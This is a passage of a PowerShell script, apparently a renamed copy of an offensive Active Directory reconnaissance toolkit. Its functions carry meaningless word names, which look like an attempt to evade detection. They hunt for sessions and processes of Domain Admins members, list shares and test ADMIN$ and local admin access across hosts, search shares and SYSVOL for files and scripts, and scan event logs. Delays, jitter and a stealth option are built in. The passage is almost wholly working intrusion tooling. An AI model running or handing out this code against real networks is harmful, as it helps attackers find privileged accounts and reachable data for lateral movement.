        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }


        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                if(!$DomainShortName) {

                    $Sessions = seminal -ComputerName $ComputerName
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.sesi10_username
                        $CName = $Session.sesi10_cname

                        if($CName -and $CName.StartsWith("\\")) {
                            $CName = $CName.TrimStart("\")
                        }


                        if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {

                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                $IP = cab -ComputerName $ComputerName
                                $FoundUser = New-Object PSObject
                                $FoundUser | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
                                $FoundUser | Add-Member Noteproperty 'UserName' $UserName
                                $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName
                                $FoundUser | Add-Member Noteproperty 'IP' $IP
                                $FoundUser | Add-Member Noteproperty 'SessionFrom' $CName


                                if ($CheckAccess) {
                                    $Admin = nationality -ComputerName $CName
                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin
                                }
                                else {
                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $FoundUser
                            }
                        }                                    
                    }
                }
                if(!$Stealth) {

                    $LoggedOn = plantations -ComputerName $ComputerName
                    ForEach ($User in $LoggedOn) {
                        $UserName = $User.wkui1_username


                        $UserDomain = $User.wkui1_logon_domain


                        if (($UserName) -and ($UserName.trim() -ne '')) {

                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                $Proceed = $True
                                if($DomainShortName) {
                                    if ($DomainShortName.ToLower() -ne $UserDomain.ToLower()) {
                                        $Proceed = $True
                                    }
                                    else {
                                        $Proceed = $False
                                    }
                                }
                                if($Proceed) {
                                    $IP = cab -ComputerName $ComputerName
                                    $FoundUser = New-Object PSObject
                                    $FoundUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                                    $FoundUser | Add-Member Noteproperty 'UserName' $UserName
                                    $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName
                                    $FoundUser | Add-Member Noteproperty 'IP' $IP
                                    $FoundUser | Add-Member Noteproperty 'SessionFrom' $Null


                                    if ($CheckAccess) {
                                        $Admin = nationality -ComputerName $ComputerName
                                        $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin
                                    }
                                    else {
                                        $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $FoundUser
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"


            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'DomainShortName' = $DomainShortName
            }


            acclimatizing -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {

                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = acclimatizing -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1


                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose "[*] Target user found, returning early"
                    return
                }
            }
        }

    }
}


function omens {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All"
    )

    zealot -Stealth @PSBoundParameters
}


function rep {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $ProcessName,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }


        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running rep with delay of $Delay"








        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {

                $TargetDomains = hitter | ForEach-Object { $_.Name }
            }
            else {

                $TargetDomains = @( (Clemens).name )
            }

            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += summery -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
        

            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }







        if(!$ProcessName) {
            Write-Verbose "No process name specified, building a target user set"


            $TargetUsers = @()


            if($TargetServer) {
                Write-Verbose "Querying target server '$TargetServer' for local users"
                $TargetUsers = ghettoes $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                    ($_.AccountName).split("/")[1].toLower()
                }  | Where-Object {$_}
            }

            elseif($UserName) {
                Write-Verbose "[*] Using target user '$UserName'..."
                $TargetUsers = @( $UserName.ToLower() )
            }

            elseif($UserFile) {
                $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
            }
            elseif($UserADSpath -or $UserFilter) {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for users"
                    $TargetUsers += irregular -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                        $_.samaccountname
                    }  | Where-Object {$_}
                }            
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                    $TargetUsers += warding -GroupName $GroupName -Domain $Domain -DomainController $DomainController| Foreach-Object {
                        $_.MemberName
                    }
                }
            }

            if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
                throw "[!] No users found to search for!"
            }
        }


        $HostEnumBlock = {
            param($ComputerName, $Ping, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {


                if($RemoteUserName -and $RemotePassword) {
                    $Processes = Merak -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }
                else {
                    $Processes = Merak -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }

                ForEach ($Process in $Processes) {

                    if($ProcessName) {
                        $ProcessName.split(",") | ForEach-Object {
                            if ($Process.ProcessName -match $_) {
                                $Process
                            }
                        }
                    }

                    elseif ($TargetUsers -contains $Process.User) {
                        $Process
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"


            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ProcessName' = $ProcessName
                'TargetUsers' = $TargetUsers
                'RemoteUserName' = $RemoteUserName
                'RemotePassword' = $RemotePassword
            }


            acclimatizing -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {

                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = acclimatizing -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1


                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose "[*] Target user/process found, returning early"
                    return
                }
            }
        }

    }
}


function piteous {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Int32]
        $SearchDays = 3,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }


        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running piteous"

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {

            $TargetDomains = hitter | ForEach-Object { $_.Name }
        }
        else {

            $TargetDomains = @( (Clemens).name )
        }







        if(!$ComputerName) { 

            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($ComputerFilter -or $ComputerADSpath) {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"
                    $ComputerName += summery -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            else {

                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for domain controllers"
                    $ComputerName += terracing -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                }
            }


            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }








        $TargetUsers = @()


        if($TargetServer) {
            Write-Verbose "Querying target server '$TargetServer' for local users"
            $TargetUsers = ghettoes $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                ($_.AccountName).split("/")[1].toLower()
            }  | Where-Object {$_}
        }

        elseif($UserName) {
            Write-Verbose "[*] Using target user '$UserName'..."
            $TargetUsers = @( $UserName.ToLower() )
        }

        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter) {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users"
                $TargetUsers += irregular -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                    $_.samaccountname
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                $TargetUsers += warding -GroupName $GroupName -Domain $Domain -DomainController $DomainController | Foreach-Object {
                    $_.MemberName
                }
            }
        }

        if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }


        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $SearchDays)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {

                perpetuates -ComputerName $ComputerName -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {

                    $TargetUsers -contains $_.UserName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"


            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'SearchDays' = $SearchDays
            }


            acclimatizing -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {

                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = acclimatizing -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1


                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $(-not $NoPing), $TargetUsers, $SearchDays
            }
        }

    }
}


function brainstorm {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
 
        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }


        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running brainstorm with delay of $Delay"


        [String[]] $ExcludedShares = @('')

        if ($ExcludePrint) {
            $ExcludedShares = $ExcludedShares + "PRINT$"
        }
        if ($ExcludeIPC) {
            $ExcludedShares = $ExcludedShares + "IPC$"
        }
        if ($ExcludeStandard) {
            $ExcludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }


        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {

                $TargetDomains = hitter | ForEach-Object { $_.Name }
            }
            else {

                $TargetDomains = @( (Clemens).name )
            }
                
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += summery -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
        

            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.count) -eq 0) {
                throw "No hosts found!"
            }
        }


        $HostEnumBlock = {
            param($ComputerName, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {

                $Shares = pinches -ComputerName $ComputerName
                ForEach ($Share in $Shares) {
                    Write-Debug "[*] Server share: $Share"
                    $NetName = $Share.shi1_netname
                    $Remark = $Share.shi1_remark
                    $Path = '\\'+$ComputerName+'\'+$NetName


                    if (($NetName) -and ($NetName.trim() -ne '')) {

                        if($CheckAdmin) {
                            if($NetName.ToUpper() -eq "ADMIN$") {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$ComputerName\$NetName `t- $Remark"
                                }
                                catch {
                                    Write-Debug "Error accessing path $Path : $_"
                                }
                            }
                        }

                        elseif ($ExcludedShares -NotContains $NetName.ToUpper()) {

                            if($CheckShareAccess) {

                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$ComputerName\$NetName `t- $Remark"
                                }
                                catch {
                                    Write-Debug "Error accessing path $Path : $_"
                                }
                            }
                            else {
                                "\\$ComputerName\$NetName `t- $Remark"
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"


            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'CheckShareAccess' = $CheckShareAccess
                'ExcludedShares' = $ExcludedShares
                'CheckAdmin' = $CheckAdmin
            }


            acclimatizing -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {

                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = acclimatizing -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1


                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
            }
        }
        
    }
}


function outlooks {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String[]]
        $Terms,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $TermList,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [Switch]
        $SearchForest,

        [Switch]
        $SearchSYSVOL,

        [ValidateRange(1,100)] 
        [Int]
        $Threads,

        [Switch]
        $UsePSDrive,

        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }


        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running outlooks with delay of $Delay"

        $Shares = @()


        [String[]] $ExcludedShares = @("C$", "ADMIN$")


        if ($IncludeC) {
            if ($IncludeAdmin) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @("ADMIN$")
            }
        }

        if ($IncludeAdmin) {
            if ($IncludeC) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @("C$")
            }
        }


        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }


        if ($TermList) {
            ForEach ($Term in Get-Content -Path $TermList) {
                if (($Term -ne $Null) -and ($Term.trim() -ne '')) {
                    $Terms += $Term
                }
            }
        }


        if($ShareList) {
            ForEach ($Item in Get-Content -Path $ShareList) {
                if (($Item -ne $Null) -and ($Item.trim() -ne '')) {

                    $Share = $Item.Split("`t")[0]
                    $Shares += $Share
                }
            }
        }
        else {

            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }

            if(!$ComputerName) {

                if($Domain) {
                    $TargetDomains = @($Domain)
                }
                elseif($SearchForest) {

                    $TargetDomains = hitter | ForEach-Object { $_.Name }
                }
                else {

                    $TargetDomains = @( (Clemens).name )
                }

                if($SearchSYSVOL) {
                    ForEach ($Domain in $TargetDomains) {
                        $DCSearchPath = "\\$Domain\SYSVOL\"
                        Write-Verbose "[*] Adding share search path $DCSearchPath"
                        $Shares += $DCSearchPath
                    }
                    if(!$Terms) {

                        $Terms = @('.vbs', '.bat', '.ps1')
                    }
                }
                else {
                    [array]$ComputerName = @()

                    ForEach ($Domain in $TargetDomains) {
                        Write-Verbose "[*] Querying domain $Domain for hosts"
                        $ComputerName += summery -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                    }


                    $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
                    if($($ComputerName.Count) -eq 0) {
                        throw "No hosts found!"
                    }
                }
            }
        }


        $HostEnumBlock = {
            param($ComputerName, $Ping, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential)

            Write-Verbose "ComputerName: $ComputerName"
            Write-Verbose "ExcludedShares: $ExcludedShares"
            $SearchShares = @()

            if($ComputerName.StartsWith("\\")) {

                $SearchShares += $ComputerName
            }
            else {

                $Up = $True
                if($Ping) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                }
                if($Up) {

                    $Shares = pinches -ComputerName $ComputerName
                    ForEach ($Share in $Shares) {

                        $NetName = $Share.shi1_netname
                        $Path = '\\'+$ComputerName+'\'+$NetName


                        if (($NetName) -and ($NetName.trim() -ne '')) {


                            if ($ExcludedShares -NotContains $NetName.ToUpper()) {

                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $SearchShares += $Path
                                }
                                catch {
                                    Write-Debug "[!] No access to $Path"
                                }
                            }
                        }
                    }
                }
            }

            ForEach($Share in $SearchShares) {
                $SearchArgs =  @{
                    'Path' = $Share
                    'Terms' = $Terms
                    'OfficeDocs' = $OfficeDocs
                    'FreshEXEs' = $FreshEXEs
                    'LastAccessTime' = $LastAccessTime
                    'LastWriteTime' = $LastWriteTime
                    'CreationTime' = $CreationTime
                    'ExcludeFolders' = $ExcludeFolders
                    'ExcludeHidden' = $ExcludeHidden
                    'CheckWriteAccess' = $CheckWriteAccess
                    'OutFile' = $OutFile
                    'UsePSDrive' = $UsePSDrive
                    'Credential' = $Credential
                }

                ballasted @SearchArgs
            }
        }
    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"


            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ExcludedShares' = $ExcludedShares
                'Terms' = $Terms
                'ExcludeFolders' = $ExcludeFolders
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'OutFile' = $OutFile
                'UsePSDrive' = $UsePSDrive
                'Credential' = $Credential
            }


            if($Shares) {

                acclimatizing -ComputerName $Shares -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }
            else {
                acclimatizing -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }        
        }

        else {
            if($Shares){
                $ComputerName = $Shares
            }
            elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {

                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = acclimatizing -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            $ComputerName | Where-Object {$_} | ForEach-Object {
                Write-Verbose "Computer: $_"
                $Counter = $Counter + 1


                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $_ ($Counter of $($ComputerName.count))"

                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $_, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential                
            }
        }
    }
}


function stiffed {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }


        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running stiffed with delay of $Delay"


        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) {
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {

                $TargetDomains = hitter | ForEach-Object { $_.Name }
            }
            else {

                $TargetDomains = @( (Clemens).name )
            }

            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += summery -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
        

            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }


        $HostEnumBlock = {
            param($ComputerName, $Ping)

            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {

                $Access = nationality -ComputerName $ComputerName
                if ($Access) {
                    $ComputerName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"


            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
            }


            acclimatizing -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {

                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = acclimatizing -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1


                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}


function longhorn {

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem = '*',

        [String]
        $ServicePack = '*',

        [String]
        $Filter,

        [Switch]
        $Ping,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    Write-Verbose "[*] Grabbing computer accounts from Active Directory..."


    $TableAdsComputers = New-Object System.Data.DataTable 
    $Null = $TableAdsComputers.Columns.Add('Hostname')       
    $Null = $TableAdsComputers.Columns.Add('OperatingSystem')
    $Null = $TableAdsComputers.Columns.Add('ServicePack')
    $Null = $TableAdsComputers.Columns.Add('LastLogon')

